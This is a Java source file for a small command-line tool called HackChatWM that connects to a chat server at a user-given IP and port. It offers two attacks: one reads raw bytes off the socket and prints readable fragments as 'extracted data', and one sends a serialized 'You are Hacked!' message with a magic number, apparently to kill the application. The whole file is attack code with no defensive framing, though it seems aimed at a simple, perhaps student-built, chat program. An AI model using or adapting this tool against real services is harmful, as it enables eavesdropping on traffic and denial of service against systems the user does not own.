import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.Socket;
import java.util.Objects;
import java.util.Scanner;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class HackChatWM {

    Scanner inputScanner;
    String ipAddress;
    int portNum;
    ExecutorService executorService;
    Socket socket;

    HackChatWM(){
        getInitialUserData();
        String input;
        label:
        do{
            System.out.println("\n\nEnter 1 to extract information.");
            System.out.println("Enter 2 to try to kill application.");
            System.out.println("Enter 3 to exit.");
            input = inputScanner.nextLine();
            switch (input) {
                case "1":
                    extractInformation();
                    break;
                case "2":
                    tryToKill();
                    break;
                case "3":
                    break label;
                case null:
                default:
                    System.out.println("Enter a valid input!");
                    break;
            }

        }while(true);
    }

    void tryToKill(){
        try {
            socket = new Socket(ipAddress, portNum);
            executorService = Executors.newFixedThreadPool(1);

            try {
                executorService.execute(() -> {
                    try {
                        ObjectOutputStream outputStream = new ObjectOutputStream(socket.getOutputStream());
                        outputStream.writeObject("Hacker: You are Hacked!");
                        outputStream.writeObject(2342);
                        outputStream.flush();
                        System.out.println("Sent Msg!");
                    } catch (IOException e) {
                        System.out.println("IO Exception Occurred, Try Again!");
                        e.printStackTrace();
                    }
                });
            } catch (RuntimeException e) {
                System.err.println("Failed while creating Threads: " + e.getMessage());
            }
        } catch (IOException er) {
            System.out.println("Failed to Connect! "+er.getMessage());
        }
    }

    void extractInformation(){
        try {
            socket = new Socket(ipAddress, portNum);
            executorService = Executors.newFixedThreadPool(1);

            try {
                executorService.execute(() -> {
                    try {
                        InputStream inputStream = socket.getInputStream();
                        byte[] buffer = new byte[1024];
                        int bytesRead;

                        while ((bytesRead = inputStream.read(buffer)) != -1) {
                            StringBuilder printableText = new StringBuilder();
                            for (int i = 0; i < bytesRead; i++) {
                                char ch = (char) buffer[i];
                                if (ch >= 32 && ch <= 126) { // Only keep standard readable ASCII characters
                                    printableText.append(ch);
                                } else if (!printableText.isEmpty()) {
                                    String fragment = printableText.toString().trim();
                                    if (fragment.length() > 2)
                                        System.out.println("Extracted Data: " + fragment);
                                    printableText.setLength(0);
                                }
                            }
                            if (printableText.length() > 2)
                                System.out.println("Extracted Data: " + printableText.toString().trim());
                        }
                    }catch (IOException e) {
                        System.out.println("Connection lost! "+e.getMessage());
                    }
                });
                executorService.shutdown();

                inputScanner.nextLine();
                executorService.shutdownNow();
                executorService.close();
                executorService = null;
            } catch (RuntimeException e) {
                System.err.println("Failed while creating Threads: " + e.getMessage());
            }
        } catch (IOException er) {
            System.out.println("Failed to Connect! "+er.getMessage());
        }
    }


    void getInitialUserData(){
        inputScanner = new Scanner(System.in);

        System.out.print("Enter IP Address (Leave empty for localhost): ");
        ipAddress = inputScanner.nextLine();
        if(Objects.equals(ipAddress, "")) ipAddress = "localhost";

        System.out.print("Enter Port Number to Connect: ");
        do {
            try {
                String inp = inputScanner.nextLine();
                portNum = ("".equals(inp)) ? 0 :Integer.parseInt(inp);
                break;
            } catch (Exception e) {
                System.out.println("\nPlease Enter Correct Value!");
                System.out.print("Enter Port Number to Connect: ");
            }
        }while(true);
    }


    static void main() {
        new HackChatWM();
    }
}
